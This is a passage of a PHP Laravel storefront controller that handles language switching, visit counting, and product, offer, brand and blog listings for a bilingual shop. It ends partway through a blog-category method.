<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\Currency;
use App\Models\Offer;
use App\Models\OfferProduct;
use App\Models\Language;
use App\Models\Category;
use App\Models\Brand;
use App\Models\Childcategory;
use App\Models\Subcategory;
use App\Models\BlogCategory;
use App\Models\Counter;
use App\Models\Generalsetting;
use App\Userdetails;
use App\Models\Order;
use App\Models\Color;
use App\Models\Product;
use App\Models\Zone;
use App\Models\ProductNotify;
use App\Models\Subscriber;
use App\Models\User;
use App\Models\Cart;
use App\Models\Notifications;
use Carbon\Carbon;
use Auth;
use App;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Validator;

class FrontendController extends Controller
{
  public function __construct()
  {
    $this->auth_guests();
    if (isset($_SERVER['HTTP_REFERER'])) {
      $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
      if ($referral != $_SERVER['SERVER_NAME']) {

        $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
        if ($brwsr->count() > 0) {
          $brwsr = $brwsr->first();
          $tbrwsr['total_count'] = $brwsr->total_count + 1;
          $brwsr->update($tbrwsr);
        } else {
          $newbrws = new Counter();
          $newbrws['referral'] = $this->getOS();
          $newbrws['type'] = "browser";
          $newbrws['total_count'] = 1;
          $newbrws->save();
        }

        $count = Counter::where('referral', $referral);
        if ($count->count() > 0) {
          $counts = $count->first();
          $tcount['total_count'] = $counts->total_count + 1;
          $counts->update($tcount);
        } else {
          $newcount = new Counter();
          $newcount['referral'] = $referral;
          $newcount['total_count'] = 1;
          $newcount->save();
        }
      }
    } else {
      $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
      if ($brwsr->count() > 0) {
        $brwsr = $brwsr->first();
        $tbrwsr['total_count'] = $brwsr->total_count + 1;
        $brwsr->update($tbrwsr);
      } else {
        $newbrws = new Counter();
        $newbrws['referral'] = $this->getOS();
        $newbrws['type'] = "browser";
        $newbrws['total_count'] = 1;
        $newbrws->save();
      }
    }
  }

  function getOS()
  {

    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
      '/windows nt 10/i'     =>  'Windows 10',
      '/windows nt 6.3/i'     =>  'Windows 8.1',
      '/windows nt 6.2/i'     =>  'Windows 8',
      '/windows nt 6.1/i'     =>  'Windows 7',
      '/windows nt 6.0/i'     =>  'Windows Vista',
      '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
      '/windows nt 5.1/i'     =>  'Windows XP',
      '/windows xp/i'         =>  'Windows XP',
      '/windows nt 5.0/i'     =>  'Windows 2000',
      '/windows me/i'         =>  'Windows ME',
      '/win98/i'              =>  'Windows 98',
      '/win95/i'              =>  'Windows 95',
      '/win16/i'              =>  'Windows 3.11',
      '/macintosh|mac os x/i' =>  'Mac OS X',
      '/mac_powerpc/i'        =>  'Mac OS 9',
      '/linux/i'              =>  'Linux',
      '/ubuntu/i'             =>  'Ubuntu',
      '/iphone/i'             =>  'iPhone',
      '/ipod/i'               =>  'iPod',
      '/ipad/i'               =>  'iPad',
      '/android/i'            =>  'Android',
      '/blackberry/i'         =>  'BlackBerry',
      '/webos/i'              =>  'Mobile'
    );

    foreach ($os_array as $regex => $value) {

      if (preg_match($regex, $user_agent)) {
        $os_platform    =   $value;
      }
    }
    return $os_platform;
  }


  // -------------------------------- HOME PAGE SECTION ----------------------------------------

  public function index(Request $request, $lang)
  {
    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }

    $this->code_image();
    if (!empty($request->reff)) {
      $affilate_user = User::where('affilate_code', '=', $request->reff)->first();
      if (!empty($affilate_user)) {
        $gs = Generalsetting::findOrFail(1);
        if ($gs->is_affilate == 1) {
          Session::put('affilate', $affilate_user->id);
          return redirect()->route('front.index');
        }
      }
    }

    $sliders = DB::table('sliders')->where('mobile_setting', 0)->get();

    // dd($sliders->first());

    $top_small_banners = DB::table('banners')->where('type', '=', 'TopSmall')->get();
    $ps = DB::table('pagesettings')->find(1);
    $feature_products =  Product::where('featured', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
    $fix_banners = DB::table('banners')->where('type', '=', 'Fix')->get();
    
    $services = DB::table('services')->where('user_id', '=', 0)->get();
    $bottom_small_banners = DB::table('banners')->where('type', '=', 'BottomSmall')->get();
    $large_banners = DB::table('banners')->where('type', '=', 'Large')->get();
    $reviews =  DB::table('reviews')->get();

    $partners = DB::table('partners')->get();
    $discount_products =  Product::where('is_discount', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
    $best_products = Product::where('best', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(6)->get();
    $top_products = Product::where('top', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();;
    $big_products = Product::where('big', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(6)->get();;
    $hot_products =  Product::where('hot', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
    $latest_products =  Product::where('latest', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
    $trending_products =  Product::where('trending', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
    $sale_products =  Product::where('sale', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
    $language =  getLang();

    //dd($ps);
    return view('front.index', compact('ps', 'language', 'sliders', 'top_small_banners', 'feature_products', 'services', 'reviews', 'large_banners', 'bottom_small_banners', 'best_products', 'top_products', 'hot_products', 'latest_products', 'big_products', 'trending_products', 'sale_products', 'discount_products', 'partners', 'fix_banners'));
  }



  public function index_demoo1(Request $request)
  {
    $this->code_image();
    if (!empty($request->reff)) {
      $affilate_user = User::where('affilate_code', '=', $request->reff)->first();
      if (!empty($affilate_user)) {
        $gs = Generalsetting::findOrFail(1);
        if ($gs->is_affilate == 1) {
          Session::put('affilate', $affilate_user->id);
          return redirect()->route('front.index');
        }
      }
    }

    $sliders = DB::table('sliders')->get();

    $top_small_banners = DB::table('banners')->where('type', '=', 'TopSmall')->get();
    $ps = DB::table('pagesettings')->find(1);
    $feature_products =  Product::where('featured', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();


    $services = DB::table('services')->where('user_id', '=', 0)->get();
    $bottom_small_banners = DB::table('banners')->where('type', '=', 'BottomSmall')->get();
    $large_banners = DB::table('banners')->where('type', '=', 'Large')->get();
    $reviews =  DB::table('reviews')->get();

    $partners = DB::table('partners')->get();
    $discount_products =  Product::where('is_discount', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
    $best_products = Product::where('best', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(6)->get();
    $top_products = Product::where('top', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();;
    $big_products = Product::where('big', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(6)->get();;
    $hot_products =  Product::where('hot', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
    $latest_products =  Product::where('latest', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
    $trending_products =  Product::where('trending', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
    $sale_products =  Product::where('sale', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();

    return view('front.index_dem1', compact('ps', 'sliders', 'top_small_banners', 'feature_products', 'services', 'reviews', 'large_banners', 'bottom_small_banners', 'best_products', 'top_products', 'hot_products', 'latest_products', 'big_products', 'trending_products', 'sale_products', 'discount_products', 'partners'));
  }

  public function extraIndex()
  {



    $services = DB::table('services')->where('user_id', '=', 0)->get();
    $bottom_small_banners = DB::table('banners')->where('type', '=', 'BottomSmall')->get();
    $large_banners = DB::table('banners')->where('type', '=', 'Large')->get();
    $reviews =  DB::table('reviews')->get();
    $ps = DB::table('pagesettings')->find(1);
    $partners = DB::table('partners')->get();
    $discount_products =  Product::where('is_discount', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
    $best_products = Product::where('best', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(6)->get();
    $top_products = Product::where('top', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
    $big_products = Product::where('big', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(6)->get();
    $hot_products = Product::where('hot', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
    $latest_products =  Product::where('latest', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
    $trending_products = Product::where('trending', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
    $sale_products = Product::where('sale', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();

    return view('front.extraindex', compact('ps', 'services', 'reviews', 'large_banners', 'bottom_small_banners', 'best_products', 'top_products', 'hot_products', 'latest_products', 'big_products', 'trending_products', 'sale_products', 'discount_products', 'partners'));
  }

  // -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------

  public function  products(Request $request, $lang)

  {
    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }


    $products = Product::where('status', true)->paginate(12);

    if ($request->ajax()) {
      return view('front.pagination.brand', compact('products'));
    }
    return view('front.products', compact('products'));
  }
  public function  products_34(Request $request, $lang)

  {
    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }


    $products = Product::paginate(9);

    if ($request->ajax()) {
      return view('front.pagination.brand', compact('products'));
    }
    return view('front.f-products', compact('products'));
  }

  // LANGUAGE SECTION

  public function offers(Request $request, $lang, $slug)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }

    $cur = Session::get('currency');
    if ($cur) {
      $currency = Currency::find($cur);
    } else {
      $currency = Currency::where('is_default', 1)->first();
    }

    $cat = null;
    $subcat = null;
    $childcat = null;
    $minprice = $request->min / $currency->value;
    $maxprice = $request->max / $currency->value;
    $sort = $request->sort;
    $search = $request->search;

    $offers = Offer::where('slug', $slug)->orwhere('slug_ar', $slug)->first();
    $pro_id = OfferProduct::where('offer_id', $offers->id)->get()->pluck('product_id');
    /*
      if (!empty($slug)) {
        $cat = Category::where('slug', $slug)->firstOrFail();
        $data['cat'] = $cat;
      }
      if (!empty($slug1)) {
        $subcat = Subcategory::where('slug', $slug1)->firstOrFail();
        $data['subcat'] = $subcat;
      }
      if (!empty($slug2)) {
        $childcat = Childcategory::where('slug', $slug2)->firstOrFail();
        $data['childcat'] = $childcat;
      }*/

    $prods = Product::whereIn('id', $pro_id)
      /*   ->when($cat, function ($query, $cat) {
                                      return $query->where('category_id', $cat->id);
                                  })
                                  ->when($subcat, function ($query, $subcat) {
                                      return $query->where('subcategory_id', $subcat->id);
                                  })
                                  ->when($childcat, function ($query, $childcat) {
                                      return $query->where('childcategory_id', $childcat->id);
                                  })*/
      ->when($search, function ($query, $search) {
        $slang = Session::get('language');
        $lang  = DB::table('languages')->where('is_default', '=', 1)->first();
        if (!$slang) {
          if ($lang->id == 2) {
            return $query->whereRaw('MATCH (name_ar) AGAINST (? IN BOOLEAN MODE)', array($search));
          } else {
            return $query->whereRaw('MATCH (name) AGAINST (? IN BOOLEAN MODE)', array($search));
          }
        } else {
          if ($slang == 2) {
            return $query->whereRaw('MATCH (name_ar) AGAINST (? IN BOOLEAN MODE)', array($search));
          } else {
            return $query->whereRaw('MATCH (name) AGAINST (? IN BOOLEAN MODE)', array($search));
          }
        }
      })
      ->when($minprice, function ($query, $minprice) {
        return $query->where('price', '>=', $minprice);
      })
      ->when($maxprice, function ($query, $maxprice) {
        return $query->where('price', '<=', $maxprice);
      })
      ->when($sort, function ($query, $sort) {
        if ($sort == 'date_desc') {
          return $query->orderBy('id', 'DESC');
        } elseif ($sort == 'date_asc') {
          return $query->orderBy('id', 'ASC');
        } elseif ($sort == 'price_desc') {
          return $query->orderBy('price', 'DESC');
        } elseif ($sort == 'price_asc') {
          return $query->orderBy('price', 'ASC');
        }
      })
      ->when(empty($sort), function ($query, $sort) {
        return $query->orderBy('id', 'DESC');
      });

    $prods = $prods->where(function ($query) use ($cat, $subcat, $childcat, $request) {
      $flag = 0;

      if (!empty($cat)) {
        foreach ($cat->attributes as $key => $attribute) {
          $inname = $attribute->input_name;
          $chFilters = $request["$inname"];
          if (!empty($chFilters)) {
            $flag = 1;
            foreach ($chFilters as $key => $chFilter) {
              if ($key == 0) {
                $query->where('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
              } else {
                $query->orWhere('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
              }
            }
          }
        }
      }


      if (!empty($subcat)) {
        foreach ($subcat->attributes as $attribute) {
          $inname = $attribute->input_name;
          $chFilters = $request["$inname"];
          if (!empty($chFilters)) {
            $flag = 1;
            foreach ($chFilters as $key => $chFilter) {
              if ($key == 0 && $flag == 0) {
                $query->where('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
              } else {
                $query->orWhere('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
              }
            }
          }
        }
      }


      if (!empty($childcat)) {
        foreach ($childcat->attributes as $attribute) {
          $inname = $attribute->input_name;
          $chFilters = $request["$inname"];
          if (!empty($chFilters)) {
            $flag = 1;
            foreach ($chFilters as $key => $chFilter) {
              if ($key == 0 && $flag == 0) {
                $query->where('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
              } else {
                $query->orWhere('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
              }
            }
          }
        }
      }
    });


    $prods = $prods->where('status', 1)->get();
    $prods = (new Collection(Product::filterProducts($prods)))->paginate(12);

    $data['prods'] = $prods;
    $data['offers'] = $offers;

    if ($request->ajax()) {

      $data['ajax_check'] = 1;

      return view('includes.product.filtered-products', $data);
    }
    return view('front.offers', $data);
  }
  public function offers_34(Request $request, $lang, $slug)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }

    $cur = Session::get('currency');
    if ($cur) {
      $currency = Currency::find($cur);
    } else {
      $currency = Currency::where('is_default', 1)->first();
    }

    $cat = null;
    $subcat = null;
    $childcat = null;
    $minprice = $request->min / $currency->value;
    $maxprice = $request->max / $currency->value;
    $sort = $request->sort;
    $search = $request->search;

    $offers = Offer::where('slug', $slug)->orwhere('slug_ar', $slug)->first();
    $pro_id = OfferProduct::where('offer_id', $offers->id)->get()->pluck('product_id');
    /*
      if (!empty($slug)) {
        $cat = Category::where('slug', $slug)->firstOrFail();
        $data['cat'] = $cat;
      }
      if (!empty($slug1)) {
        $subcat = Subcategory::where('slug', $slug1)->firstOrFail();
        $data['subcat'] = $subcat;
      }
      if (!empty($slug2)) {
        $childcat = Childcategory::where('slug', $slug2)->firstOrFail();
        $data['childcat'] = $childcat;
      }*/

    $prods = Product::whereIn('id', $pro_id)
      /*   ->when($cat, function ($query, $cat) {
                                      return $query->where('category_id', $cat->id);
                                  })
                                  ->when($subcat, function ($query, $subcat) {
                                      return $query->where('subcategory_id', $subcat->id);
                                  })
                                  ->when($childcat, function ($query, $childcat) {
                                      return $query->where('childcategory_id', $childcat->id);
                                  })*/
      ->when($search, function ($query, $search) {
        $slang = Session::get('language');
        $lang  = DB::table('languages')->where('is_default', '=', 1)->first();
        if (!$slang) {
          if ($lang->id == 2) {
            return $query->whereRaw('MATCH (name_ar) AGAINST (? IN BOOLEAN MODE)', array($search));
          } else {
            return $query->whereRaw('MATCH (name) AGAINST (? IN BOOLEAN MODE)', array($search));
          }
        } else {
          if ($slang == 2) {
            return $query->whereRaw('MATCH (name_ar) AGAINST (? IN BOOLEAN MODE)', array($search));
          } else {
            return $query->whereRaw('MATCH (name) AGAINST (? IN BOOLEAN MODE)', array($search));
          }
        }
      })
      ->when($minprice, function ($query, $minprice) {
        return $query->where('price', '>=', $minprice);
      })
      ->when($maxprice, function ($query, $maxprice) {
        return $query->where('price', '<=', $maxprice);
      })
      ->when($sort, function ($query, $sort) {
        if ($sort == 'date_desc') {
          return $query->orderBy('id', 'DESC');
        } elseif ($sort == 'date_asc') {
          return $query->orderBy('id', 'ASC');
        } elseif ($sort == 'price_desc') {
          return $query->orderBy('price', 'DESC');
        } elseif ($sort == 'price_asc') {
          return $query->orderBy('price', 'ASC');
        }
      })
      ->when(empty($sort), function ($query, $sort) {
        return $query->orderBy('id', 'DESC');
      });

    $prods = $prods->where(function ($query) use ($cat, $subcat, $childcat, $request) {
      $flag = 0;

      if (!empty($cat)) {
        foreach ($cat->attributes as $key => $attribute) {
          $inname = $attribute->input_name;
          $chFilters = $request["$inname"];
          if (!empty($chFilters)) {
            $flag = 1;
            foreach ($chFilters as $key => $chFilter) {
              if ($key == 0) {
                $query->where('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
              } else {
                $query->orWhere('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
              }
            }
          }
        }
      }


      if (!empty($subcat)) {
        foreach ($subcat->attributes as $attribute) {
          $inname = $attribute->input_name;
          $chFilters = $request["$inname"];
          if (!empty($chFilters)) {
            $flag = 1;
            foreach ($chFilters as $key => $chFilter) {
              if ($key == 0 && $flag == 0) {
                $query->where('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
              } else {
                $query->orWhere('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
              }
            }
          }
        }
      }


      if (!empty($childcat)) {
        foreach ($childcat->attributes as $attribute) {
          $inname = $attribute->input_name;
          $chFilters = $request["$inname"];
          if (!empty($chFilters)) {
            $flag = 1;
            foreach ($chFilters as $key => $chFilter) {
              if ($key == 0 && $flag == 0) {
                $query->where('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
              } else {
                $query->orWhere('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
              }
            }
          }
        }
      }
    });


    $prods = $prods->where('status', 1)->get();
    $prods = (new Collection(Product::filterProducts($prods)))->paginate(12);

    $data['prods'] = $prods;
    $data['offers'] = $offers;

    if ($request->ajax()) {

      $data['ajax_check'] = 1;

      return view('includes.product.filtered-products', $data);
    }
    return view('front.f-offers', $data);
  }

  public function language($id)
  {

    $slang = Session::get('language');


    if (!$slang) {
      $lang  = DB::table('languages')->where('is_default', '=', 1)->first();
    } else {
      $lang  = DB::table('languages')->where('id', '=', $slang)->first();
    }

    $u =  url()->previous();


    $this->code_image();
    Session::put('language', $id);
    $sign = DB::table('languages')->where('id', '=', $id)->first();

    $x =  str_replace('/' . $lang->sign, '/' . $sign->sign, $u);




    // echo $x;

    return redirect($x);
    //   return redirect()->route('front.index',$sign->sign);   


    //   if($id == 1) {

    //           $x =  str_replace("ar", "en", $u);
    //           return redirect($x);
    // //   //  return redirect()->route('front.index');
    //      }else {
    //           $x =  str_replace("en", "ar", $u);
    //       
    // //       //  return redirect()->route('front.arindex');
    //      }

    //   return redirect()->back();
  }

  // LANGUAGE SECTION ENDS


  // CURRENCY SECTION

  public function currency($id)
  {

    $this->code_image();
    if (Session::has('coupon')) {
      Session::forget('coupon');
      Session::forget('free_shipping');
      Session::forget('coupon_code');
      Session::forget('coupon_id');
      Session::forget('coupon_total');
      Session::forget('coupon_total1');
      Session::forget('already');
      Session::forget('coupon_percentage');
    }
    Session::put('currency', $id);
    return redirect()->back();
  }


  // CURRENCY SECTION ENDS



  public function brand(Request $request, $lang, $slug)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }


    $this->code_image();

    $brand = Brand::where('slug', $slug)->orwhere('slug_ar', $slug)->where('status', 1)->first();

    $products  = Product::where('brand_id', $brand->id)->orderBy('id', 'DESC')->where('status', true)->paginate(12);
    
   if ($request->ajax()) {
// dd($request);
     $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }
    $data = [];
    $cur = Session::get('currency');
    if ($cur) {
      $currency = Currency::find($cur);
    } else {
      $currency = Currency::where('is_default', 1)->first();
    }

    $brand = null;
    $subcat = null;
    $childcat = null;

    if($request->min !='undefined' && $request->max !='undefined'){
         $minprice = $request->min / $currency->value;
    $maxprice = $request->max / $currency->value;
    }else{
         $minprice = 0;
    $maxprice = 0;
    }
   
    $sort = $request->sort;
    $search = $request->search;
    $slug = $request->slug;
    
    $brand = Brand::where('slug', $slug)->orwhere('slug_ar', $slug)->where('status', 1)->first();

    
    
     $prods = Product::when($brand, function ($query, $brand) {
      return $query->where('brand_id', $brand->id);
    })
      ->when($subcat, function ($query, $subcat) {
        return $query->where('subcategory_id', $subcat->id);
      })
      ->when($childcat, function ($query, $childcat) {
        return $query->where('childcategory_id', $childcat->id);
      })
      ->when($search !== "undefined", function ($query) use ($search) {
        if(!empty($search)){
        $slang = Session::get('language');
        $lang  = DB::table('languages')->where('is_default', '=', 1)->first();
        if (!$slang) {
          if ($lang->id == 2) {
            return $query->whereRaw('MATCH (name_ar) AGAINST (? IN BOOLEAN MODE)', array($search))->orWhereRaw('MATCH (name) AGAINST (? IN BOOLEAN MODE)', array($search))->orWhere('name', 'like', '%' . $search . '%')->orWhere('name_ar', 'like', '%' . $search . '%');
          } else {
            return $query->whereRaw('MATCH (name) AGAINST (? IN BOOLEAN MODE)', array($search))->orWhereRaw('MATCH (name_ar) AGAINST (? IN BOOLEAN MODE)', array($search))->orWhere('name', 'like', '%' . $search . '%')->orWhere('name_ar', 'like', '%' . $search . '%');
          }
        } else {
          if ($slang == 2) {
            return $query->whereRaw('MATCH (name_ar) AGAINST (? IN BOOLEAN MODE)', array($search))->orWhereRaw('MATCH (name) AGAINST (? IN BOOLEAN MODE)', array($search))->orWhere('name', 'like', '%' . $search . '%')->orWhere('name_ar', 'like', '%' . $search . '%');
          } else {
            return $query->whereRaw('MATCH (name) AGAINST (? IN BOOLEAN MODE)', array($search))->orWhereRaw('MATCH (name_ar) AGAINST (? IN BOOLEAN MODE)', array($search))->orWhere('name', 'like', '%' . $search . '%')->orWhere('name_ar', 'like', '%' . $search . '%');
          }
        }
            
        }
      })
      ->when($minprice, function ($query, $minprice) {

        $query->whereHas('colors', function ($query) use ($minprice) {
          $query->where('size_price', '>=', $minprice);
        });
      })
      ->when($maxprice, function ($query, $maxprice) {

        $query->whereHas('colors', function ($query) use ($maxprice) {
          $query->where('size_price', '<=', $maxprice);
        });
      })
      ->when($sort, function ($query, $sort) {
        if ($sort == 'date_desc') {
          return $query->orderBy('id', 'DESC');
        } elseif ($sort == 'date_asc') {
          return $query->orderBy('id', 'ASC');
        } elseif ($sort == 'price_desc') {
          return $query->orderBy('price', 'DESC');
        } elseif ($sort == 'price_asc') {
          return $query->orderBy('price', 'ASC');
        }
      })
      ->when(empty($sort), function ($query, $sort) {
        return $query->orderBy('id', 'DESC');
      }
      );
    
    // -----------------------------------------------//
    // $prods = $prods->where(function ($query) use ($brand, $subcat, $childcat, $request) {
    //   $flag = 0;
    //   if (!empty($cat)) {
                   

    //     foreach ($cat->attributes as $key => $attribute) {
        
    //       $inname = $attribute->input_name;
    //       $chFilters = $request[$inname];
    //       if (!empty($chFilters)) {
    //         $flag = 1;
    //         foreach ($chFilters as $key => $chFilter) {
    //           if ($key == 0) {
    //             $query->where('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
    //           } else {
    //             $query->orWhere('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
    //           }
    //         }
    //       }
    //     }
    //   }

    //   if (!empty($subcat)) {
    //     foreach ($subcat->attributes as $attribute) {
    //       $inname = $attribute->input_name;
    //       $chFilters = $request["$inname"];
    //       if (!empty($chFilters)) {
    //         $flag = 1;
    //         foreach ($chFilters as $key => $chFilter) {
    //           if ($key == 0 && $flag == 0) {
    //             $query->where('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
    //           } else {
    //             $query->orWhere('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
    //           }
    //         }
    //       }
    //     }
    //   }


    //   if (!empty($childcat)) {
    //     foreach ($childcat->attributes as $attribute) {
    //       $inname = $attribute->input_name;
    //       $chFilters = $request["$inname"];
    //       if (!empty($chFilters)) {
    //         $flag = 1;
    //         foreach ($chFilters as $key => $chFilter) {
    //           if ($key == 0 && $flag == 0) {
    //             $query->where('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
    //           } else {
    //             $query->orWhere('attributes', 'like', '%' . '"' . $chFilter . '"' . '%');
    //           }
    //         }
    //       }
    //     }
    //   }
    // });


    $products = $prods->where('status', true)->paginate(12);
   
      $data['ajax_check'] = 1;

      return view('includes.product.brand-products', compact('products', 'brand','slug'));
    }
    return view('front.single_brand', compact('products', 'brand','slug'));
  }


  public function brand_34(Request $request, $lang, $slug)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }


    $this->code_image();

    $brand = Brand::where('slug', $slug)->orwhere('slug_ar', $slug)->where('status', 1)->first();

    $products  = Product::where('brand_id', $brand->id)->paginate(12);

    return view('front.f-single_brand', compact('products', 'brand'));
  }

  public function brands(Request $request, $lang)

  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }

    $this->code_image();
    $brands =  Brand::where('status', 1)->get();

    if ($request->ajax()) {
      return view('front.pagination.brand', compact('brands'));
    }
    return view('front.brands', compact('brands'));
  }

  public function brands_34(Request $request, $lang)

  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }

    $this->code_image();
    $brands =  Brand::where('status', 1)->get();

    if ($request->ajax()) {
      return view('front.pagination.brand', compact('brands'));
    }
    return view('front.f-brands', compact('brands'));
  }

  public function autosearch($lang, $slug)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }
    if (strlen($slug) > 1) {
      $search = ' ' . $slug;
      $prods = Product::where('name', 'like', '%' . $search . '%')->orWhere('name_ar', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->orWhere('name_ar', 'like', $slug . '%')->where('status', '=', 1)->take(10)->get();
      return view('load.suggest', compact('prods', 'slug'));
    }
    return "";
  }

  function finalize()
  {
    $actual_path = str_replace('project', '', base_path());
    $dir = $actual_path . 'install';
    $this->deleteDir($dir);
    return redirect('/');
  }

  function auth_guests()
  {
    $chk = MarkuryPost::marcuryBase();
    $chkData = MarkuryPost::marcurryBase();
    $actual_path = str_replace('project', '', base_path());
    if ($chk != MarkuryPost::maarcuryBase()) {
      if ($chkData < MarkuryPost::marrcuryBase()) {
        if (is_dir($actual_path . '/install')) {
          header("Location: " . url('/install'));
          die();
        } else {
          echo MarkuryPost::marcuryBasee();
          die();
        }
      }
    }
  }



  // -------------------------------- BLOG SECTION ----------------------------------------

  public function blog(Request $request, $lang)
  {
    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }


    $this->code_image();
    $blogs = Blog::orderBy('created_at', 'desc')->paginate(9);
    if ($request->ajax()) {
      return view('front.pagination.blog', compact('blogs'));
    }
    
    $tagz='';
    $name = Blog::pluck('tags')->toArray();
    foreach ($name as $nm) {
      $tagz .= $nm . ',';
    }
    $tags = array_unique(explode(',', $tagz));
     $bcats = BlogCategory::all();
     $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
      return $item->created_at->format('F Y');
    })->take(5)->toArray();
    return view('front.blog', compact('blogs','archives','bcats', 'tags'));
  }


  public function blog_34(Request $request, $lang)
  {
    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }


    $this->code_image();
    $blogs = Blog::orderBy('created_at', 'desc')->paginate(9);
    if ($request->ajax()) {
      return view('front.pagination.blog', compact('blogs'));
    }
    return view('front.f-blogs', compact('blogs'));
  }



  public function blogcategory(Request $request, $lang, $slug)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }

    $this->code_image();
